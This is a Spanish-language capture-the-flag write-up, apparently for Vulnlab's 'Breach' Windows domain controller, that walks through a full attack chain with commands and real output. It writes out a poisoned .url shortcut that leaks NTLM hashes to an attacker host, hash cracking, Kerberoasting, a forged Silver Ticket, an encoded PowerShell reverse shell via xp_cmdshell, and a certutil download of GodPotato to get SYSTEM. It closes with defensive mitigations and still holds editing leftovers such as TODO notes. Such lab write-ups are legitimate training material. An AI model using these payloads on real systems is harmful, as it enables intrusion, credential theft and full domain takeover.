---
title: "Breach"
description: "Writeup de Breach - Vulnlab - Dificultad: Medium. SCF/URL poisoning + Kerberoast + Silver Ticket MSSQL + GodPotato."
sidebar:
  badge:
    text: Medium
    variant: caution
---

{/*
Tags sugeridos (descomenta y añade `tags` al schema en src/content.config.ts si quieres usarlos):
  - vulnlab
  - windows
  - medium
  - active-directory
  - scf-poisoning
  - responder
  - ntlmv2-crack
  - kerberoast
  - silver-ticket
  - mssql
  - xp-cmdshell
  - godpotato
  - seimpersonateprivilege
*/}

# 🖥️ Breach

> 📅 Fecha: 2026-05-15
> 🎯 Plataforma: Vulnlab *(el commit dice HTB pero el dominio `breach.vl` y el patrón `.vl` corresponden a Vulnlab — confirmar)*
> ⚙️ SO: Windows Server 2022 (Build 20348)
> 🎚️ Dificultad: Medium
> 🏆 Puntos: 450
> 🌐 IP: `10.129.34.228`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración SMB (guest)](#-enumeración-smb-guest)
- [Foothold: SCF/URL Poisoning → Responder → Crack](#-foothold-scfurl-poisoning--responder--crack)
- [Pivote a MSSQL: Kerberoast + Silver Ticket](#-pivote-a-mssql-kerberoast--silver-ticket)
- [Escalada de Privilegios: GodPotato](#-escalada-de-privilegios-godpotato)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

Breach es un Domain Controller Windows Server 2022 cuyo foothold inicial se obtiene mediante **SMB anonymous + share con permisos de escritura**. Subiendo un archivo `.url` (Internet Shortcut) con icono apuntando a un share UNC controlado por el atacante, se fuerza a cualquier usuario que liste el directorio en Explorer a autenticar contra ese host, exponiendo su hash **NetNTLMv2**. Responder captura el hash de `Julia.Wong`, que se rompe con `rockyou.txt` (`Computer1`) en menos de un segundo. Con Julia se ejecuta **Kerberoast** sobre la cuenta de servicio `svc_mssql`, cuyo hash TGS-REP cae también con rockyou (`Trustno1`). En lugar de autenticar directamente como `svc_mssql`, se forja un **Silver Ticket** para el SPN `MSSQLSvc/breachdc.breach.vl:1433` impersonando a `Administrator`, lo que da acceso DBO al MSSQL como `BREACH\Administrator`. Vía `xp_cmdshell` se obtiene una reverse shell como `svc_mssql` con **`SeImpersonatePrivilege`** habilitado, vector clásico para **GodPotato** → `NT AUTHORITY\SYSTEM` → `root.txt`.

| Campo | Valor |
|-------|-------|
| Puntos débiles | SMB share escribible por guest, NTLM poisoning, contraseñas débiles, Kerberoast, MSSQL accesible sin segmentación, `SeImpersonatePrivilege` |
| CVEs | N/A (cadena de misconfiguraciones AD) |
| Herramientas | `nmap`, `nxc`, `smbmap`, `smbclient`, `responder`, `hashcat`, `bloodhound-python`, `bloodyAD`, `impacket-GetUserSPNs`, `impacket-ticketer`, `impacket-mssqlclient`, `GodPotato` |
| Tiempo total | *ver tus notas* |

---

## 🔍 Reconocimiento

### Escaneo de puertos (nmap)

```bash
nmap -sSCV -Pn 10.129.34.228
```

salida real:

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 14:14 -0400
Nmap scan report for 10.129.34.228
Host is up (0.22s latency).
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-15 18:14:27Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.129.34.228:1433:
|     Target_Name: BREACH
|     NetBIOS_Domain_Name: BREACH
|     NetBIOS_Computer_Name: BREACHDC
|     DNS_Domain_Name: breach.vl
|     DNS_Computer_Name: BREACHDC.breach.vl
|_    Product_Version: 10.0.20348
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: breach.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

> 💡 **Análisis:** DC Windows Server 2022 (`BREACHDC.breach.vl`) con la pila clásica AD (53/88/135/139/389/445/464/636/3268/3269/3389/5985) + **MSSQL 2019 en 1433** + IIS en 80. Lo que destaca: **SMB signing required** (no hay relay clásico SMB→SMB) y la presencia de SQL Server directamente en el DC (anti-patrón típico de laboratorios), lo que abre la puerta a Kerberoast del SPN `MSSQLSvc/...`.

### Resolución DNS local

```bash
echo "10.129.34.228 breach.vl BREACHDC.breach.vl" | sudo tee -a /etc/hosts
```

```text
10.129.34.228 breach.vl BREACHDC.breach.vl
```

---

## 🗂️ Enumeración SMB (guest)

### Shares accesibles como `guest` (null auth)

```bash
nxc smb 10.129.34.228 -u 'guest' -p '' --shares
```

salida real:

```text
SMB    10.129.34.228   445   BREACHDC   [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB    10.129.34.228   445   BREACHDC   [+] breach.vl\guest:
SMB    10.129.34.228   445   BREACHDC   [*] Enumerated shares
SMB    10.129.34.228   445   BREACHDC   Share           Permissions     Remark
SMB    10.129.34.228   445   BREACHDC   -----           -----------     ------
SMB    10.129.34.228   445   BREACHDC   ADMIN$                          Remote Admin
SMB    10.129.34.228   445   BREACHDC   C$                              Default share
SMB    10.129.34.228   445   BREACHDC   IPC$            READ            Remote IPC
SMB    10.129.34.228   445   BREACHDC   NETLOGON                        Logon server share
SMB    10.129.34.228   445   BREACHDC   share           READ,WRITE
SMB    10.129.34.228   445   BREACHDC   SYSVOL                          Logon server share
SMB    10.129.34.228   445   BREACHDC   Users           READ
```

> 💡 **Análisis clave:** dos hallazgos:
> 1. **`share` tiene `READ,WRITE`** como guest. Esto habilita el clásico ataque de **SCF/URL/LNK poisoning**: dejar un fichero que fuerce a cualquier usuario que liste el directorio en Explorer a autenticar contra una IP UNC del atacante.
> 2. El share `Users` es READ → puede dar credenciales por descuido (perfiles, scripts).

### Recorrido recursivo de los shares

```bash
smbmap -H 10.129.34.228 -u 'guest' -p '' -r
```

salida real (recortada a lo relevante):

```text
[+] IP: 10.129.34.228:445       Name: breach.vl     Status: Authenticated
        Disk                    Permissions    Comment
        ----                    -----------    -------
        share                   READ, WRITE
        ./share
        dr--r--r--    0  Fri May 15 14:26:55 2026   .
        dr--r--r--    0  Tue Sep  9 06:35:32 2025   ..
        dr--r--r--    0  Thu Feb 17 07:19:36 2022   finance
        dr--r--r--    0  Thu Feb 17 07:19:13 2022   software
        dr--r--r--    0  Mon Sep  8 06:13:44 2025   transfer
        Users                   READ ONLY
        ./Users
        dw--w--w--    0  Thu Feb 17 09:12:16 2022   .
        dr--r--r--    0  Tue Sep  9 06:35:32 2025   ..
        dw--w--w--    0  Thu Feb 10 05:10:33 2022   Default
        fr--r--r--  174  Wed Feb  9 22:25:32 2022   desktop.ini
        dw--w--w--    0  Thu Feb 17 09:29:39 2022   Public
```

> 💡 **Análisis:** dentro de `share` hay tres subdirectorios temáticos: `finance`, `software`, **`transfer`**. El nombre "transfer" sugiere fuertemente que es un directorio donde **otros usuarios suben/descargan archivos** — exactamente donde queremos plantar el payload de poisoning porque será visitado tarde o temprano por usuarios autenticados.

---

## 🚪 Foothold: SCF/URL Poisoning → Responder → Crack

### Primer intento: archivo SCF

El archivo SCF (`Shell Command File`) era el clásico para forzar leak de NTLM via `IconFile=\\<atacante>\...`, pero en versiones recientes de Windows Explorer está parcheado y a menudo no dispara:

```bash
cat > @attack.scf << 'EOF'
[Shell]
Command=2
IconFile=\\10.10.17.16\share\test.ico
[Taskbar]
Command=ToggleDesktop
EOF
```

```bash
smbclient //10.129.34.228/share -U guest -c "cd transfer; put @attack.scf"
```

```text
Password for [WORKGROUP\guest]:
putting file @attack.scf as \transfer\@attack.scf (0.2 kB/s) (average 0.2 kB/s)
```

> 💡 **Nota:** el `@` al principio del nombre fuerza el orden alfabético al principio del listado, lo que ayuda a que Explorer lo intente renderizar primero.

### Segundo intento (el que sí funcionó): archivo URL (Internet Shortcut)

```bash
cat > @attack.url << 'EOF'
[InternetShortcut]
URL=file://10.10.17.16/test
IconFile=\\10.10.17.16\share\icon.ico
IconIndex=0
EOF
```

```bash
smbclient //10.129.34.228/share -U guest -c "cd transfer; put @attack.url"
```

```text
Password for [WORKGROUP\guest]:
putting file @attack.url as \transfer\@attack.url (0.2 kB/s) (average 0.2 kB/s)
```

> 💡 **Análisis:** los `.url` siguen disparando la carga del icono via UNC en Windows Explorer (incluso en Server 2022). El intento de resolución `\\10.10.17.16\share\icon.ico` autentica con el SMB del atacante usando el contexto del usuario que esté listando el directorio en ese momento.

### Listener: Responder

```bash
sudo responder -I tun0 -v
```

salida real (recortada al evento que importa):

```text
[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
[+] Servers:
    HTTP / HTTPS / SMB / Kerberos / SQL / ...   [ON]
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.17.16]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.34.228
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:bb47a68124cbed23:A20930BF368E9221233400FBED93662B:0101000000000000[...]
```

> 💡 **Análisis:** ¡bingo! El hash NetNTLMv2 de **`Julia.Wong`** llega a los pocos minutos. Algún proceso automatizado o usuario real está listando el directorio `transfer` en Explorer.

### Crack del NetNTLMv2

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

salida real (recortada a lo relevante):

```text
JULIA.WONG::BREACH:d5ec3b38d20e549c:a8a222f625d6c96f1b2591673df7984c:[...]:Computer1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Time.Started.....: Fri May 15 14:52:27 2026 (0 secs)
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```

✅ Credenciales: **`julia.wong:Computer1`**

### Recogida del user flag (a través del propio share)

```bash
smb: \transfer\julia.wong\> ls
  user.txt        A       32  Wed Apr 16 20:38:22 2025
smb: \transfer\julia.wong\> get user.txt
```

```text
cat user.txt
[user flag]
```

> 💡 **Análisis:** la usuaria tiene su propio subdirectorio en `transfer\julia.wong\` con el `user.txt` accesible para ella misma — y como ahora autenticamos con sus credenciales, también para nosotros.

---

## 🔑 Pivote a MSSQL: Kerberoast + Silver Ticket

### Enumeración con BloodHound y bloodyAD

```bash
bloodhound-python -u julia.wong -p 'Computer1' -d breach.vl -ns 10.129.34.228 -c All --zip
```

salida real:

```text
INFO: Found AD domain: breach.vl
INFO: Found 1 computers
INFO: Found 15 users
INFO: Found 54 groups
INFO: Compressing output into 20260515145919_bloodhound.zip
```

```bash
bloodyAD --host 10.129.34.228 -u 'julia.wong' -p 'Computer1' get writable
```

salida real:

```text
distinguishedName: CN=Users,DC=breach,DC=vl
permission: CREATE_CHILD

distinguishedName: CN=Computers,DC=breach,DC=vl
permission: CREATE_CHILD

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=breach,DC=vl
permission: WRITE

distinguishedName: CN=BREACHDC,OU=Domain Controllers,DC=breach,DC=vl
permission: CREATE_CHILD

distinguishedName: OU=staff,DC=breach,DC=vl
permission: CREATE_CHILD

distinguishedName: CN=Julia Wong,OU=staff,DC=breach,DC=vl
permission: WRITE
```

> 💡 **Análisis:** Julia tiene permisos interesantes (CREATE_CHILD en varias OUs y WRITE sobre sí misma), pero nada inmediato hacia DA. La ruta más limpia es **Kerberoast** del SPN `MSSQLSvc/...` que vimos en nmap.

### Kerberoast del SPN de MSSQL

```bash
impacket-GetUserSPNs breach.vl/julia.wong:Computer1 -dc-ip 10.129.34.228 -request
```

salida real:

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName              Name       MemberOf  PasswordLastSet              LastLogon
--------------------------------  ---------  --------  ---------------------------  ---------------------------
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 06:43:08.106169   2026-05-15 14:12:28.811128

$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*$d0305b1e08f4f15d8ffef412fc3a7f01$44119cdcd0d6f290435c98d15cfad0c4595a31a071f6813039ca87ad7139dc87[...]
```

> 💡 **Análisis:** `svc_mssql` está kerberoasteable (etype 23 RC4 — débil). Su contraseña no ha cambiado desde 2022 → muy probable que sea débil de fábrica.

### Crack del TGS-REP

```bash
hashcat -m 13100 scv_msqql.txt /usr/share/wordlists/rockyou.txt
```

salida real (recortada):

```text
$krb5tgs$23$*svc_mssql$BREACH.VL$breach.vl/svc_mssql*[...]:Trustno1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Time.Started.....: Fri May 15 15:19:29 2026 (0 secs)
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
```

✅ Credenciales: **`svc_mssql:Trustno1`**

### Acceso directo a MSSQL como `svc_mssql`

```bash
impacket-mssqlclient overwatch.htb/svc_mssql:'Trustno1'@10.129.34.228 -windows-auth
```

```text
SQL (BREACH\svc_mssql  guest@master)>
```

> ⚠️ **Inconsistencia detectada:** el dominio que pasaste en este comando es `overwatch.htb` (de otra máquina). Funciona porque con `-windows-auth` solo se usa para el formato del binding NTLM, pero el correcto sería `breach.vl/svc_mssql:'Trustno1'@10.129.34.228 -windows-auth`. Estamos como `guest@master` → tenemos que escalar el contexto si queremos llegar a `xp_cmdshell`.

### Forjar un Silver Ticket impersonando `Administrator` sobre el SPN MSSQL

Como tenemos el hash de `svc_mssql` (la clave del servicio), podemos forjar un **Silver Ticket** TGS para el SPN `MSSQLSvc/breachdc.breach.vl:1433` impersonando a cualquier usuario — incluido `Administrator`. Esto da `BREACH\Administrator` dentro del SQL Server (con DBO y acceso a `xp_cmdshell`):

**1. Calcular el NT hash de `Trustno1`:**

```bash
python3 -c "import hashlib; print(hashlib.new('md4', 'Trustno1'.encode('utf-16le')).hexdigest())"
```

```text
69596c7aa1e8daee17f8e78870e25a5c
```

**2. Forjar el ticket:**

> ⚠️ **TODO:** falta documentar cómo obtuviste el `domain-sid`. Sugerencia para añadir:
> ```bash
> impacket-lookupsid breach.vl/julia.wong:'Computer1'@10.129.34.228 0
> ```
> Pega el output real con el SID `S-1-5-21-2330692793-3312915120-706255856`.

```bash
impacket-ticketer -nthash 69596c7aa1e8daee17f8e78870e25a5c \
                  -domain-sid S-1-5-21-2330692793-3312915120-706255856 \
                  -domain breach.vl \
                  -spn MSSQLSvc/breachdc.breach.vl:1433 \
                  Administrator
```

salida real:

```text
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

**3. Usar el ticket vía Kerberos:**

```bash
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k BREACHDC.breach.vl
```

```text
SQL (BREACH\Administrator  dbo@master)>
```

> 💡 **Análisis:** ahora estamos como **`BREACH\Administrator`** dentro de MSSQL con rol DBO. Esto habilita `xp_cmdshell` sin restricciones (BREACH\Administrator es sysadmin a nivel de SQL). Importante: este "Administrator" es solo a efectos del SQL Server — **no es Domain Admin todavía**. La ejecución de comandos via xp_cmdshell se hará bajo la cuenta de servicio del SQL Server, que es `svc_mssql`.

### Reverse shell vía `xp_cmdshell`

Payload PowerShell base64 (TCPClient → reverse shell hacia `10.10.17.16:4443`):

```sql
EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4AMQA2ACIALAA0ADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';
```

Listener:

```bash
rlwrap -cAr nc -lvnp 4443
```

```text
listening on [any] 4443 ...
connect to [10.10.17.16] from (UNKNOWN) [10.129.34.228] 55122

PS C:\Windows\system32> whoami
breach\svc_mssql
```

---

## 🚀 Escalada de Privilegios: GodPotato

### Comprobación de privilegios

```powershell
PS C:\Users> whoami /priv
```

salida real:

```text
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

> 💡 **Análisis:** **`SeImpersonatePrivilege` está Enabled**. Este es el "santo grial" de la escalada en servicios Windows: cualquier proceso con este privilegio puede impersonar tokens de otros usuarios. Es el vector clásico de los `*Potato` (Rotten/Juicy/Rogue/God Potato). Como la máquina es Server 2022, **GodPotato** es la herramienta correcta (las anteriores fallan en versiones modernas).

### Descarga y ejecución de GodPotato

En el atacante:

```bash
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe -O GodPotato.exe
python3 -m http.server 80
```

```text
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.34.228 - - [15/May/2026 16:07:40] "GET /GodPotato.exe HTTP/1.1" 200 -
```

En la víctima:

```powershell
cd C:\Windows\Temp
certutil -urlcache -f http://10.10.17.16/GodPotato.exe GodPotato.exe
.\GodPotato.exe -cmd "cmd /c whoami"
```

salida real:

```text
[*] CombaseModule: 0x140724771094528
[*] DispatchTable: 0x140724773685112
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\a5238c82-392c-49c9-afcc-41990143124d\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 920 Token:0x748  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4404
nt authority\system
```

### Lectura del root flag (one-shot)

```powershell
.\GodPotato.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
```

```text
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 6500
[root flag]
```

### Alternativa: reverse shell completa como SYSTEM

```powershell
.\GodPotato.exe -cmd "cmd /c powershell -e <base64-revshell-puerto-4444>"
```

```text
rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.16] from (UNKNOWN) [10.129.34.228] 55317

PS C:\Windows\Temp> whoami
nt authority\system
PS C:\Windows\Temp> type C:\Users\Administrator\Desktop\root.txt
[root flag]
```

---

## 🏁 Flags

| Flag | Hash |
|------|------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🕸️ Cadena de Ataque

```text
1. SMB enum con guest → share "share" con READ,WRITE en transfer/
        ↓
2. Subir @attack.url (Internet Shortcut con IconFile UNC al atacante)
        ↓
3. Responder captura NetNTLMv2 de Julia.Wong al listar el directorio
        ↓
4. hashcat -m 5600 → julia.wong:Computer1
        ↓
5. Lectura de user.txt en \\share\transfer\julia.wong\
        ↓
6. GetUserSPNs con julia → kerberoast de svc_mssql
        ↓
7. hashcat -m 13100 → svc_mssql:Trustno1
        ↓
8. NT hash de Trustno1 → ticketer forja Silver Ticket
        ↓ (impersonando Administrator sobre MSSQLSvc/breachdc:1433)
9. mssqlclient -k como BREACH\Administrator (dbo)
        ↓
10. xp_cmdshell → powershell rev shell → svc_mssql con SeImpersonate
        ↓
11. GodPotato → NT AUTHORITY\SYSTEM → root.txt
```

---

## 🎓 Lecciones Aprendidas

- **Guest + share escribible = NTLM leak garantizado.** El truco del `.url` con `IconFile=\\<UNC>` sigue funcionando contra Server 2022. El `.scf` está parcheado en Explorer moderno, así que mejor ir directo a `.url` o `.library-ms`.
- **El prefijo `@` en el nombre del archivo** sube el item al principio del listado alfabético en Explorer, aumentando la probabilidad de que dispare al renderizar la vista.
- **Cuentas de servicio con SPN + contraseña anterior a la política actual = Kerberoast trivial.** El `PasswordLastSet: 2022-02-17` de `svc_mssql` es la señal: contraseña vieja, probablemente puesta a mano por un admin, probablemente débil. RC4 (etype 23) lo confirma.
- **Silver Ticket > Pass-the-Hash directo cuando quieres impersonar a otra cuenta sobre un servicio específico.** No necesitas comprometer al `Administrator` del dominio para que el SQL Server te trate como tal — basta con tener la clave de la cuenta de servicio del SPN al que apuntas.
- **`SeImpersonatePrivilege` en una cuenta de servicio Windows = SYSTEM**. No hay excepciones realistas en Server 2022; `GodPotato` lo cubre. Servicios web (IIS, MSSQL, Tomcat, Exchange) corren por defecto con este privilegio.

### Mitigaciones (lado defensivo)
1. **Quitar permisos de escritura a `guest`/`Everyone`** en cualquier share. Si necesitas un transfer público, separa "drop-box" (escritura sin listado) de "pickup" (solo el dueño).
2. **Bloquear NTLM saliente a redes externas** vía GPO (`Restrict NTLM: Outgoing NTLM traffic to remote servers`). Mitiga el SCF/URL poisoning en sitio.
3. **No reutilizar la cuenta de servicio MSSQL con SPN registrado y contraseña humana**. Migrar a **gMSA** (Group Managed Service Accounts) — Active Directory rota la contraseña cada 30 días con entropía de 240 bits → kerberoast inútil.
4. **No instalar SQL Server en el Domain Controller**. Es el anti-patrón que permite el silver ticket → DBO directo en el DC.
5. **Limitar `SeImpersonatePrivilege`** revisando qué cuentas de servicio lo tienen. Si es posible, ejecutar MSSQL bajo una cuenta sin él (rara vez es viable, pero sí auditarlo).
6. **Habilitar Extended Protection for Authentication (EPA)** en MSSQL y auditar `xp_cmdshell` (debería estar desactivado por defecto y solo habilitarse para mantenimiento puntual).

---

## 📚 Referencias

- [HackTricks - SCF/URL/LNK poisoning](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb#scf-and-other-files-windows-shares)
- [HackTricks - Kerberoast](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
- [HackTricks - Silver Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)
- [HackTricks - SeImpersonatePrivilege](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#seimpersonateprivilege)
- [GodPotato (BeichenDream)](https://github.com/BeichenDream/GodPotato)
- [Responder](https://github.com/lgandx/Responder)
- [Impacket suite](https://github.com/fortra/impacket)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)